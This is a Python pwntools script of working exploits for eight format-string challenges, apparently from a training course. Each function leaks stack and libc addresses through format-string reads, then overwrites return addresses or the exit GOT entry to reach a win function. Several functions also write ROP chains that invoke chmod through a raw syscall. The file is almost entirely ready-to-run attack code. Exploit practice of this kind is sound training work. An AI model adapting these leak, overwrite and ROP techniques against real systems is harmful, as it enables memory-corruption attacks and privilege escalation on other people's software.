from pwn import *
import os
import time
import re

CHALLENGE_NAME = f"/challenge/babyformat_level{os.getenv('HOSTNAME')[-1:]}"

def chall1_exec(payload):
    with process([CHALLENGE_NAME], close_fds=False) as p:
        payload = payload.replace(b'END', b'end')
        p.sendline(payload)
        p.readuntil(b'Show me what you got :P\n')
        res = p.readline()
        print(res)
        res = res.replace(b'end', b'END')
        return res


def challenge1():
    libc = ELF(f"/lib/x86_64-linux-gnu/libc.so.6")
    binary = ELF(CHALLENGE_NAME)
    win = 0x40131d

    fmtstr = FmtStr(chall1_exec)

    with process([CHALLENGE_NAME], close_fds=False) as p:
        info(p.clean())
        p.sendline(b'%7$lx')
        info(p.readuntil(b'Show me what you got :P\n'))
        ret_addr = int(p.readline().strip().decode(), 16)
        writes = {ret_addr + 1048: win}
        payload = b'a' * fmtstr.padlen + fmtstr_payload(fmtstr.offset, writes)
        p.sendline(payload)
        info(p.clean())
        p.sendline(b'END')
        info(p.clean())
        p.poll(block=True)


def chall2_exec(payload):
    with process([CHALLENGE_NAME], close_fds=False) as p:
        payload = payload.replace(b'END', b'end')
        
        # p.readline()
        p.sendline(payload)
        p.readuntil(b'Your input is:')
        p.readline()
        
        res = p.readline()
        print(res)
        res = res.replace(b'end', b'END')
        return res


def challenge2():
    libc = ELF(f"/lib/x86_64-linux-gnu/libc.so.6")
    binary = ELF(CHALLENGE_NAME)

    fmtstr = FmtStr(chall2_exec)
    padding = b'a' * fmtstr.padlen
    offset = fmtstr.offset

    # with gdb.debug([CHALLENGE_NAME], '''
    # disp/5i $rip
    # disp/40gx $rsp
    # b read@plt
    # c
    # finish
    # c
    # finish
    # c
    # finish
    # c
    # finish
    # ''') as p:

    with process([CHALLENGE_NAME], close_fds=False) as p:
        info(p.clean())
        p.sendline(b'%194$lx')
        info(p.readuntil(b'Your input is:'))
        p.readline()
        win = int(p.readline().strip().decode(), 16) - 1040

        print(hex(win))

        info(p.clean())
        p.sendline(b'%7$lx')
        info(p.readuntil(b'Your input is:'))
        p.readline()
        ret_addr = int(p.readline().strip().decode(), 16) + 942
        print(hex(ret_addr))

        writes = {ret_addr : win}
        num_written = len('Your input is:                                                                                                           \n') + len(padding)
        payload = padding + fmtstr_payload(offset, writes, numbwritten=num_written)
        p.sendline(payload)
        print("here")
        info(p.clean())
        p.sendline(b'END')
        info(p.clean())
        p.poll(block=True)

def chall3_exec(payload):
    with process([CHALLENGE_NAME], close_fds=False) as p:
        payload = payload.replace(b'END', b'end')
        
        # p.readline()
        p.sendline(payload)
        p.readuntil(b'Your input is:')
        p.readline()
        
        res = p.readline()
        print(res)
        res = res.replace(b'end', b'END')
        return res


def challenge3():
    libc = ELF(f"/lib/x86_64-linux-gnu/libc.so.6")
    binary = ELF(CHALLENGE_NAME)

    fmtstr = FmtStr(chall3_exec)
    padding = b'a' * fmtstr.padlen
    offset = fmtstr.offset

    # with gdb.debug([CHALLENGE_NAME], '''
    # disp/5i $rip
    # disp/40gx $rsp
    # b read@plt
    # c
    # finish
    # c
    # finish
    # c
    # finish
    # c
    # finish
    # ''') as p:

    with process([CHALLENGE_NAME], close_fds=False) as p:
        info(p.clean())
        p.sendline(b'%160$lx')
        info(p.readuntil(b'Your input is:'))
        p.readline()
        win = int(p.readline().strip().decode(), 16) - 1040

        print(hex(win))

        info(p.clean())
        p.sendline(b'%7$lx')
        info(p.readuntil(b'Your input is:'))
        p.readline()
        ret_addr = int(p.readline().strip().decode(), 16) + 951
        print(hex(ret_addr))

        writes = {ret_addr : win}
        num_written = len('Your input is:                                                                                                           \n') + len(padding)
        payload = padding + fmtstr_payload(offset, writes, numbwritten=num_written-9)
        p.sendline(payload)
        info(p.clean())
        p.sendline(b'END')
        info(p.clean())
        p.poll(block=True)

def chall4_exec(payload):
    with process([CHALLENGE_NAME], close_fds=False) as p:
        payload = payload.replace(b'END', b'end')

        p.sendline(payload)
        p.readuntil(b'Your input is:')
        p.readline()
        
        res = p.readline()
        print(res)
        res = res.replace(b'end', b'END')
        return res


def challenge4():
    libc = ELF(f"/lib/x86_64-linux-gnu/libc.so.6")
    binary = ELF(CHALLENGE_NAME)
    win = 0x4012dd
    fmtstr = FmtStr(chall4_exec)
    padding = b'a' * fmtstr.padlen
    offset = fmtstr.offset

    with process([CHALLENGE_NAME], close_fds=False) as p:
        info(p.clean())
        writes = {binary.got.exit : win}
        num_written = len('Your input is:                                   \n') + len(padding)
        payload = padding + fmtstr_payload(offset, writes, numbwritten=num_written)
        p.sendline(payload)
        info(p.clean())
        p.poll(block=True)


def chall5_exec(payload):
    with process([CHALLENGE_NAME], close_fds=False) as p:
        payload = payload.replace(b'END', b'end')

        p.sendline(payload)
        p.readuntil(b'Your input is:')
        p.readline()
        
        res = p.readline()
        print(res)
        res = res.replace(b'end', b'END')
        return res


def challenge5():
    libc = ELF(f"/lib/x86_64-linux-gnu/libc.so.6")
    binary = ELF(CHALLENGE_NAME)
    win = 0x4012dd
    pop_sled = 0x401656
    base = 0xab5+16
    fmtstr = FmtStr(chall5_exec)
    padding = b'a' * fmtstr.padlen
    offset = fmtstr.offset
    writes = {binary.got.exit : binary.symbols['func']}
    num_written = len('Your input is:                                                                                                                      \n') + len(padding)
    payload = padding + fmtstr_payload(offset, writes, numbwritten=num_written)

    # with gdb.debug([CHALLENGE_NAME], '''
    # disp/5i $rip
    # disp/40gx $rsp
    # b read@plt
    # c
    # finish
    # c
    # finish
    # ''') as p:

    with process([CHALLENGE_NAME], close_fds=False) as p:
        info(p.clean())
        p.sendline(payload)
        info(p.clean())
        p.sendline(b'%327$lx')
        info(p.readuntil(b'Your input is:'))
        info(p.readline())
        # info(p.readline())
        libc_start_main_addr = int(p.readlineb().strip().decode(), 16) - 243
        info(f'libc_start = {hex(libc_start_main_addr)}')
        libc.address = libc_start_main_addr - libc.symbols['__libc_start_main']
        # make some rop gadgets
        rop = ROP(libc)
        pop_rax = rop.find_gadget(['pop rax', 'ret']).address
        pop_rdi = rop.find_gadget(['pop rdi', 'ret']).address
        pop_rsi = rop.find_gadget(['pop rsi', 'ret']).address
        syscall = rop.find_gadget(['syscall', 'ret']).address
        trash_string = next(libc.search(b'libc_intl_domainname'))
        info(p.clean())

        print(hex(pop_rax))

        # leak stack address
        p.sendline(b'%7$lx')
        info(p.readuntil(b'Your input is:'))
        info(p.readline())
        stack_addr = (int(p.readline().strip().decode(), 16))
        print(hex(stack_addr))
        info(p.clean())
        # call pop sled which leads to the rop chain
        rop_chain = (padding + 
            fmtstr_payload(offset,{stack_addr-base:pop_rax,
                stack_addr-(base-8):0x5a, # 0x5a
                stack_addr-(base-16):pop_rdi,
                stack_addr-(base-24):trash_string,
                stack_addr-(base-32):pop_rsi,
                stack_addr-(base-40):0x9ed, # 0x9ed
                stack_addr-(base-48):syscall
                },numbwritten=num_written, write_size='byte')
            )
        p.sendline(rop_chain)
        info(p.readuntil(b'Your input is:'))
        info(p.clean())
        payload_pop_sled = padding + fmtstr_payload(offset, {binary.got.exit:pop_sled}, numbwritten=num_written, write_size='byte')
        p.sendline(payload_pop_sled)
        info(p.readuntil(b'Your input is:'))
        info(p.readline())
        info(p.readline())
        p.poll(block=True)

def chall6_exec(payload):
    with process([CHALLENGE_NAME], close_fds=False) as p:
        payload = payload.replace(b'END', b'end')

        p.sendline(payload)
        p.readuntil(b'Your input is:')
        p.readline()
        
        res = p.readline()
        print(res)
        res = res.replace(b'end', b'END')
        return res


def challenge6():
    libc = ELF(f"/lib/x86_64-linux-gnu/libc.so.6")
    binary = ELF(CHALLENGE_NAME)
    
    fmtstr = FmtStr(chall6_exec)
    padding = b'a' * fmtstr.padlen
    offset = fmtstr.offset
    num_written = len('Your input is:                                                                        \n') + len(padding)

    # with gdb.debug([CHALLENGE_NAME], '''
    # disp/5i $rip
    # disp/40gx $rsp
    # b read@plt
    # c
    # finish
    # ''') as p:

    with process([CHALLENGE_NAME], close_fds=False) as p:
        p.sendline(b'rbp: %198$lx \nret: %199$lx \nlibc: %209$lx')

        info(p.readuntil(b'rbp: '))
        rbp = int(p.readlineb().strip().decode(), 16)
        print(hex(rbp))
        info(p.readuntil(b'ret: '))
        main = int(p.readlineb().strip().decode(), 16) - 406
        print(hex(main))
        info(p.readuntil(b'libc: '))
        libc_start = int(p.readlineb().strip().decode(), 16) - 243
        print(hex(libc_start))
        overwrite = rbp - 1624

        binary.address = main - binary.symbols['main']
        libc.address = libc_start - libc.symbols['__libc_start_main']

        rop = ROP(libc)
        pop_rax = rop.find_gadget(['pop rax', 'ret']).address
        pop_rdi = rop.find_gadget(['pop rdi', 'ret']).address
        pop_rsi = rop.find_gadget(['pop rsi', 'ret']).address
        syscall = rop.find_gadget(['syscall', 'ret']).address
        trash_string = next(libc.search(b'libc_intl_domainname'))
        
        print(hex(pop_rax))
        print(hex(pop_rdi))
        print(hex(pop_rsi))
        print(hex(syscall))
        print(hex(trash_string))

        rop_chain = (padding + 
            fmtstr_payload(offset, {overwrite:pop_rax,
                overwrite+8:0x5a, # 0x5a
                overwrite+16:pop_rdi,
                overwrite+24:trash_string,
                overwrite+32:pop_rsi,
                overwrite+40:0x9ed, # 0x9ed
                overwrite+48:syscall
                },numbwritten=num_written, write_size='byte')
            )
        
        p.sendline(rop_chain)
        info(p.clean())
        p.poll(block=True)

def fmt_payload(byt):
    atoms = []
    atom = b''
    i = 0
    while byt[i+7].to_bytes(1, 'big') != b'\x00':
        # print(type(atom))
        # print()
        atom += byt[i].to_bytes(1, 'big')
        if byt[i].to_bytes(1, 'big') == b'n':
            atoms.append(atom)
            atom = b''
        i += 1

    print(atoms)

    addrs = []
    for i in range(len(byt), 0, -8):
        if b'\x00' not in byt[(i-8):(i)]: break 
        addrs.append(byt[(i-8):(i)])

    addrs.reverse()

    the_dict = {}
    first = False
    shift = []
    shift.append(first)
    the_dict.update({atoms[0]: int.from_bytes(addrs[0], "little")})
    print(f'{first} {({atoms[0]: hex(int.from_bytes(addrs[0], "little"))})}')
    for i in range(1, len(addrs)):
        first = False
        if(atoms[i].count(b'%') == 1): first = True 
        the_dict.update({atoms[i]: int.from_bytes(addrs[i], "little")})
        shift.append(first)
        print(f'{shift[i]} {({atoms[i]: hex(int.from_bytes(addrs[i], "little"))})}')
        

    print(len(addrs))
    adds = b''
    for i in range(len(addrs)):

        if shift[i]:
            print(f'this guys {hex(int.from_bytes(addrs[i], "little"))}')
            adds += addrs[i]

        else:
            adds += p64(0xdeadbeef) + addrs[i]

    stripped = [(atoms[i].decode().split('$', 1)[0][:-2]+atoms[i].decode().split('$', 1)[1]) for i in range(len(atoms))]
    atoms = ''.join(stripped).encode()

    fmt = atoms + adds
    return atoms, adds


def challenge7():
    libc = ELF(f"/lib/x86_64-linux-gnu/libc.so.6")
    binary = ELF(CHALLENGE_NAME)
    
    # fmtstr = FmtStr(chall7_exec)
    padding = b'a' * 10
    # offset = fmtstr.offset
    num_written = len('Your input is:                                                                                                                         \n')# + len(b'%x'*93)

    # with gdb.debug([CHALLENGE_NAME], '''
    # disp/5i $rip
    # disp/40gx $rsp
    # b read@plt
    # c
    # finish
    # ''') as p:

    with process([CHALLENGE_NAME], close_fds=False) as p:
        p.sendline(b' %lx '*153 + b'rbp: ' + b' %lx\n' + b'ret: ' + b' %lx\n' + b' %lx '*9 + b'\nlibc: ' + b' %lx ')

        info(p.readuntil(b'rbp: '))
        rbp = int(p.readlineb().strip().decode(), 16)
        print(hex(rbp))
        info(p.readuntil(b'ret: '))
        main = int(p.readlineb().strip().decode(), 16) - 406
        print(hex(main))
        info(p.readuntil(b'libc: '))
        libc_start = int(p.readlineb().strip().decode(), 16) - 243
        print(hex(libc_start))
        overwrite = rbp -72

        print(f'overwrite {hex(overwrite)} ')

        # return

        libc.address = libc_start - libc.symbols['__libc_start_main']

        rop = ROP(libc)
        pop_rax = rop.find_gadget(['pop rax', 'ret']).address
        pop_rdi = rop.find_gadget(['pop rdi', 'ret']).address
        pop_rsi = rop.find_gadget(['pop rsi', 'ret']).address
        syscall = rop.find_gadget(['syscall', 'ret']).address
        trash_string = next(libc.search(b'libc_intl_domainname'))
        
        print(hex(pop_rax))
        print(hex(pop_rdi))
        print(hex(pop_rsi))
        print(hex(syscall))
        print(hex(trash_string))

        rop_chain = fmtstr_payload(10, {overwrite: pop_rax, 
            overwrite+8: 0x5a,
            overwrite+16:pop_rdi,
            overwrite+24:trash_string,
            overwrite+32:pop_rsi,
            overwrite+40:0x9ed, # 0x9ed
            overwrite+48:syscall
        }, numbwritten=300, write_size='byte')

        # 0xdcabbced

        fmt, addrs = fmt_payload(rop_chain)

        padding = b'a'*(254-len(fmt))

        # fmt = fmt.replace(b'lln', b'llx')
        # fmt = fmt.replace(b'hhn', b'llx')

        print(fmt)

        # 492 = len(fmt) + padding

        # 672 = len(fmt) + len(padding) + 

        p.sendline(b'%x'*93 + fmt + padding + addrs)
        # info(p.readuntil(b'hihi'))
        info(p.clean())
        p.poll(block=True)

def challenge8():
    libc = ELF(f"/lib/x86_64-linux-gnu/libc.so.6")
    binary = ELF(CHALLENGE_NAME)
    
    fmtstr = FmtStr(chall6_exec)
    offset = fmtstr.offset
    padding = b'a' * fmtstr.padlen
    leading = len('Your input is:                              \n')

    # with gdb.debug([CHALLENGE_NAME], '''
    # disp/5i $rip
    # disp/40gx $rsp
    # disp/a $rbp
    # disp/a *(long*)$rbp
    # b read@plt
    # c
    # finish
    # ''') as p:

    with process([CHALLENGE_NAME], close_fds=False) as p:
        info(p.clean())
        payload = ""
        # burn the first 144 values on the stack
        payload += "%c"*144 
        # should change the LSB to 0x28
        # if RBP LSB was 0x20 before this means this now points to the saved RIP
        payload += f'%{0x08+(144-leading)}c%hhn'
        # overwrites the LSB of the saved RIP to go back to func() and call func2() again
        payload += f'%{0xb8 - (144+leading+47+20 + 98 - 26)}c%hhn'
        # leak the start of libc and a stack address
        payload += f'%lx ' * 10
        payload += f'\nlibc = %lx \n%c rbp = %lx'
        payload = payload.encode()
        p.sendline(payload)
        # get our leaks
        info(p.readuntil(b'libc = '))
        libc_start = int(p.readlineb().strip().decode(), 16) - 243
        print(hex(libc_start))
        info(p.readuntil(b'rbp = '))
        ret_addr = int(p.readlineb().strip().decode(), 16) - 336
        print(hex(ret_addr))
        info(p.clean())
        # do some rop stuff
        libc.address = libc_start - libc.symbols['__libc_start_main']
        rop = ROP(libc)
        pop_rax = rop.find_gadget(['pop rax', 'ret']).address
        pop_rdi = rop.find_gadget(['pop rdi', 'ret']).address
        pop_rsi = rop.find_gadget(['pop rsi', 'ret']).address
        syscall = rop.find_gadget(['syscall', 'ret']).address
        trash_string = next(libc.search(b'libc_intl_domainname'))
        rop_chain = padding + fmtstr_payload(offset, {ret_addr: pop_rax, 
            ret_addr+8: 0x5a,
            ret_addr+16:pop_rdi,
            ret_addr+24:trash_string,
            ret_addr+32:pop_rsi,
            ret_addr+40:0x9ed, # 0x9ed
            ret_addr+48:syscall
        }, numbwritten=leading + len(padding), write_size='byte')
        # send the attack
        p.send(rop_chain)
        info(p.readline())
        info(p.readline())
        info(p.clean())
        p.poll(block=True)

def main():
    context.arch = 'amd64'
    context.encoding ='latin'
    context.log_level = 'INFO'
    context.terminal = ["tmux", "splitw", "-h"]
    warnings.simplefilter('ignore')
    challenge8()


if __name__ == "__main__":
    main()